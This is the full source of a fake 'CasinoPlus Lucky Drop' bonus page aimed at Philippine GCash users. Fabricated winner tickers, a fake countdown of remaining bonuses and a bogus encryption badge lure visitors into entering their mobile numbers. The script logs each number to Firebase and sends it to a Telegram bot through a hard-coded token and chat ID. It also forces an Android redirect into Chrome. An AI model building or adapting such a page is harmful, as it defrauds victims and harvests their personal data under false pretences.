<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Lucky Drop — Premium Access</title>
    
    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,500;14..32,700;14..32,800&family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        :root {
            --gold: linear-gradient(135deg, #F5E18B 0%, #D4AF37 50%, #B8860B 100%);
            --gold-solid: #D4AF37;
            --dark: #0B0F1C;
            --glass: rgba(15, 25, 45, 0.65);
            --border-glow: rgba(212, 175, 55, 0.4);
            --shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }

        body {
            background: radial-gradient(ellipse at 30% 40%, #0A0F1E, #03050A);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        /* Animated background particles */
        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 20% 40%, rgba(212,175,55,0.08) 2%, transparent 2.5%);
            background-size: 45px 45px;
            pointer-events: none;
        }

        /* Live Ticker */
        .live-ticker {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(212, 175, 55, 0.4);
            border-radius: 100px;
            padding: 8px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 200;
            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
            animation: fadeSlideIn 0.5s ease;
        }
        .live-dot {
            width: 10px;
            height: 10px;
            background: #22c55e;
            border-radius: 50%;
            box-shadow: 0 0 10px #22c55e;
            animation: pulseGreen 1.5s infinite;
        }
        .live-text {
            font-size: 12px;
            font-weight: 500;
            color: #FFE6A3;
            letter-spacing: 0.3px;
        }
        .gc-icon {
            width: 16px;
            height: 16px;
            vertical-align: middle;
            margin: 0 3px;
        }

        /* Main Card */
        .hero-card {
            max-width: 440px;
            width: 100%;
            background: var(--glass);
            backdrop-filter: blur(16px);
            border: 1px solid var(--border-glow);
            border-radius: 56px;
            padding: 32px 28px 42px;
            box-shadow: var(--shadow), 0 0 0 1px rgba(212,175,55,0.1) inset;
            transition: transform 0.3s ease;
            position: relative;
            z-index: 10;
        }

        /* Gold shimmer border effect */
        .hero-card::after {
            content: '';
            position: absolute;
            inset: -1px;
            border-radius: 56px;
            padding: 1px;
            background: linear-gradient(125deg, rgba(212,175,55,0), var(--gold-solid), rgba(212,175,55,0));
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            opacity: 0.5;
            pointer-events: none;
        }

        .logo {
            width: 150px;
            margin: 0 auto 20px;
            display: block;
            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.4));
        }

        h1 {
            font-family: 'Orbitron', monospace;
            font-size: 28px;
            font-weight: 800;
            background: var(--gold);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-align: center;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
        }

        .subhead {
            text-align: center;
            color: #B9C7D9;
            font-size: 14px;
            font-weight: 400;
            line-height: 1.45;
            margin-bottom: 28px;
            background: rgba(0,0,0,0.3);
            padding: 8px 15px;
            border-radius: 60px;
            backdrop-filter: blur(4px);
            width: fit-content;
            margin-left: auto;
            margin-right: auto;
        }
        .subhead b {
            color: var(--gold-solid);
            font-weight: 700;
        }

        /* Scarcity / Supply Meter */
        .supply-panel {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 28px;
            padding: 16px 18px;
            margin-bottom: 28px;
            border: 1px solid rgba(255,215,0,0.2);
        }
        .supply-header {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #FFDE9E;
        }
        .progress-track {
            background: #1E2A3A;
            border-radius: 30px;
            height: 8px;
            overflow: hidden;
        }
        .progress-fill {
            width: 88%;
            height: 100%;
            background: var(--gold);
            border-radius: 30px;
            box-shadow: 0 0 6px #D4AF37;
            transition: width 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }

        /* CTA Button */
        .cta-button {
            background: var(--gold);
            border: none;
            width: 100%;
            padding: 18px 10px;
            border-radius: 60px;
            font-weight: 800;
            font-size: 18px;
            text-transform: uppercase;
            color: #0B0F1C;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 8px 0 #7A5C1A;
            font-family: inherit;
            letter-spacing: 1px;
        }
        .cta-button:active {
            transform: translateY(4px);
            box-shadow: 0 4px 0 #7A5C1A;
        }
        .cta-button:disabled {
            opacity: 0.6;
            transform: none;
            cursor: not-allowed;
            background: #4A5B6E;
            box-shadow: none;
        }

        /* Modal Premium */
        .modal-premium {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.92);
            backdrop-filter: blur(24px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .modal-card {
            max-width: 420px;
            width: 100%;
            background: rgba(12, 18, 28, 0.95);
            border-radius: 56px;
            border: 1px solid rgba(212,175,55,0.5);
            overflow: hidden;
            box-shadow: 0 30px 40px rgba(0,0,0,0.6);
            animation: modalPop 0.4s ease;
        }
        .modal-banner {
            width: 100%;
            height: 180px;
            object-fit: cover;
            background: #000;
            border-bottom: 2px solid #D4AF37;
        }
        .modal-body {
            padding: 28px 24px 32px;
            text-align: center;
        }
        .modal-body h2 {
            color: var(--gold-solid);
            font-weight: 800;
            font-size: 26px;
            margin-bottom: 8px;
        }
        .modal-body p {
            color: #9AAEC2;
            font-size: 13px;
            margin-bottom: 20px;
        }
        .phone-input {
            width: 100%;
            background: #010101;
            border: 1px solid #334155;
            border-radius: 48px;
            padding: 18px 20px;
            font-size: 20px;
            font-weight: 700;
            text-align: center;
            color: #fff;
            letter-spacing: 1px;
            margin-bottom: 18px;
            outline: none;
            transition: 0.2s;
        }
        .phone-input:focus {
            border-color: var(--gold-solid);
            box-shadow: 0 0 12px rgba(212,175,55,0.4);
        }
        .trust-badge {
            font-size: 11px;
            color: #5E6F8D;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 18px;
        }

        /* Blocked state */
        .blocked-state .hero-card {
            opacity: 0.25;
            pointer-events: none;
            filter: grayscale(0.2);
        }

        @keyframes fadeSlideIn {
            from { opacity: 0; transform: translate(-50%, -20px); }
            to { opacity: 1; transform: translate(-50%, 0); }
        }
        @keyframes modalPop {
            from { opacity: 0; transform: scale(0.96); }
            to { opacity: 1; transform: scale(1); }
        }
        @keyframes pulseGreen {
            0% { opacity: 1; transform: scale(1);}
            50% { opacity: 0.5; transform: scale(1.1);}
            100% { opacity: 1; transform: scale(1);}
        }
        @keyframes subtleGlow {
            0% { border-color: rgba(212,175,55,0.3); box-shadow: 0 0 0 0 rgba(212,175,55,0.2);}
            100% { border-color: rgba(212,175,55,0.7); box-shadow: 0 0 20px 0 rgba(212,175,55,0.3);}
        }
        .hero-card:hover {
            animation: subtleGlow 2s infinite alternate;
        }
    </style>
</head>
<body>

    <!-- Live Ticker -->
    <div class="live-ticker" id="winnerTicker">
        <div class="live-dot"></div>
        <span class="live-text" id="winnerEntry">✨ Welcome to CasinoPlus Lucky Drop ✨</span>
    </div>

    <!-- Hero Card -->
    <div class="hero-card" id="mainCard">
        <img src="images/image-7.jpg" class="logo" alt="CasinoPlus" onerror="this.src='https://placehold.co/200x80?text=CASINO+PLUS'">
        <h1>JACKPOT DROP</h1>
        <div class="subhead">🎯 Your IP is selected for today's <b>Exclusive Payout Bonus</b> 🎯</div>

        <div class="supply-panel">
            <div class="supply-header">
                <span>🔥 Bonuses Remaining</span>
                <span id="remNum">88/100</span>
            </div>
            <div class="progress-track">
                <div class="progress-fill" id="pBar" style="width: 88%"></div>
            </div>
        </div>

        <button class="cta-button" id="mainCtaBtn" onclick="handleVerify()">⚡ Check My Reward ⚡</button>
    </div>

    <!-- Premium Modal -->
    <div id="modalOverlay" class="modal-premium">
        <div class="modal-card">
            <img src="images/free_depo.jpeg" class="modal-banner" alt="Reward" onerror="this.style.display='none'">
            <div class="modal-body" id="modalBodyContent">
                <h2>🎁 Claim Your Bonus</h2>
                <p>Enter your active mobile number to unlock your reward.</p>
                <input type="tel" id="userPhone" class="phone-input" placeholder="09xxxxxxxxx" maxlength="11" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                <button class="cta-button" id="claimModalBtn" onclick="processStep1()">Claim Now</button>
                <div class="trust-badge">
                    <span>🔒</span> 256-bit Secured Encryption <span>✅</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ========== FIREBASE INIT ==========
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';

        // Helper: block user (claimed / banned)
        function showBlockedUI(reason = "claimed") {
            const overlay = document.getElementById('modalOverlay');
            const mainCard = document.getElementById('mainCard');
            overlay.style.display = 'flex';
            
            let title = "⛔ ACCESS RESTRICTED";
            let message = "⚠️ This mobile number or device is already associated with a claimed bonus. System locked to prevent duplication.";
            if (reason === "banned") {
                title = "🚫 TERMINATED";
                message = "⚠️ ACCESS_DENIED: This number or device has already received a successful payout. ";
            }

            document.getElementById('modalBodyContent').innerHTML = `
                <h2 style="color: #FF5A5A;">${title}</h2>
                <p style="font-size: 14px; line-height: 1.5;">${message}</p>
                <div style="font-size: 55px; margin: 15px 0;">🔒</div>
                <button class="cta-button" style="background: #334155; color: #ccc; box-shadow: none;" onclick="location.reload()">Device Locked</button>
                <div class="trust-badge" style="margin-top: 20px;">⛔ Permanent restriction</div>
            `;
            mainCard.style.opacity = "0.2";
            mainCard.style.pointerEvents = "none";
            document.body.classList.add('blocked-state');
        }

        // Scarcity counter dynamic
        let remainingCount = 88;
        const remSpan = document.getElementById('remNum');
        const progressFill = document.getElementById('pBar');
        
        function updateScarcityUI() {
            if(remSpan) remSpan.innerText = remainingCount + "/100";
            if(progressFill) progressFill.style.width = remainingCount + "%";
        }
        
        // Simulate diminishing bonus (high-end effect)
        setInterval(() => {
            if(remainingCount > 12) {
                const drop = Math.floor(Math.random() * 3) + 1;
                remainingCount = Math.max(remainingCount - drop, 12);
                updateScarcityUI();
            }
        }, 6000);
        
        // Live ticker (dynamic)
        function updateTicker() {
            const prefixes = ["0917","0918","0927","0998","0945","0966","0955","0977"];
            const rPre = prefixes[Math.floor(Math.random() * prefixes.length)];
            const rSuf = Math.floor(1000 + Math.random() * 9000);
            const amounts = [350, 500, 750, 1000, 1250];
            const amount = amounts[Math.floor(Math.random() * amounts.length)];
            const entrySpan = document.getElementById('winnerEntry');
            if(entrySpan) {
                entrySpan.innerHTML = `🎲 User ${rPre}***${rSuf} just claimed <img src="images/gc_icon.png" class="gc-icon" alt="GCash"> ₱${amount}`;
            }
        }
        setInterval(updateTicker, 3800);
        updateTicker();

        // Check device lock at start
        window.onload = () => {
            if (localStorage.getItem("cp_device_locked") === "true") {
                showBlockedUI();
            } else if (window.location.hash.includes("verified")) {
                document.getElementById('modalOverlay').style.display = 'flex';
            }
        };

        // Handle verify (intent / verified)
        function handleVerify() {
            if (localStorage.getItem("cp_device_locked") === "true") return showBlockedUI();
            const rawUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
            if (!window.location.hash.includes("verified")) {
                window.location.href = `intent://${rawUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
            } else {
                document.getElementById('modalOverlay').style.display = 'flex';
            }
        }

        // MAIN VALIDATION + FIREBASE LOGIC
        async function processStep1() {
            const phone = document.getElementById('userPhone').value.trim();
            const btn = document.getElementById('claimModalBtn');
            
            if (phone.length !== 11 || !phone.startsWith('09')) {
                alert("📱 Please enter a valid 11-digit mobile number starting with 09.");
                return;
            }
            
            btn.disabled = true;
            btn.innerHTML = "🔍 VERIFYING SECURE STATUS...";
            
            // 1. Check banned ghosts
            db.ref('banned_ghosts/' + phone).once('value', async (banSnap) => {
                if (banSnap.exists()) {
                    localStorage.setItem("cp_device_locked", "true");
                    showBlockedUI("banned");
                    return;
                }
                
                // 2. Check if user already claimed (user_logs)
                db.ref('user_logs/' + phone).once('value', async (logSnap) => {
                    if (logSnap.exists() && logSnap.val().status === 'claimed') {
                        localStorage.setItem("cp_device_locked", "true");
                        showBlockedUI();
                        return;
                    }
                    
                    // 3. (Optional) blacklist array (static)
                    const blockedStatic = window.BLACKLISTED_NUMBERS || [];
                    if (blockedStatic.includes(phone)) {
                        localStorage.setItem("cp_device_locked", "true");
                        showBlockedUI();
                        return;
                    }
                    
                    // 4. Initialize / update user_session (so admin can see ghost)
                    const userSessionRef = db.ref('user_sessions/' + phone);
                    const sessionSnap = await userSessionRef.once('value');
                    if (!sessionSnap.exists()) {
                        await userSessionRef.set({
                            phone: phone,
                            balance: 0,
                            clicks: 0,
                            hasShared: false,
                            lastUpdate: Date.now()
                        });
                    } else {
                        await userSessionRef.update({ lastUpdate: Date.now() });
                    }
                    
                    // 5. All clear → Telegram notification + proceed to main
                    try {
                        localStorage.setItem("userPhone", phone);
                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone)}`);
                        btn.innerHTML = "✅ SUCCESS! REDIRECTING...";
                        setTimeout(() => {
                            window.location.href = "main.html";
                        }, 800);
                    } catch (e) {
                        localStorage.setItem("userPhone", phone);
                        window.location.href = "main.html";
                    }
                });
            });
        }

        // expose globally
        window.handleVerify = handleVerify;
        window.processStep1 = processStep1;
    </script>
</body>
</html>
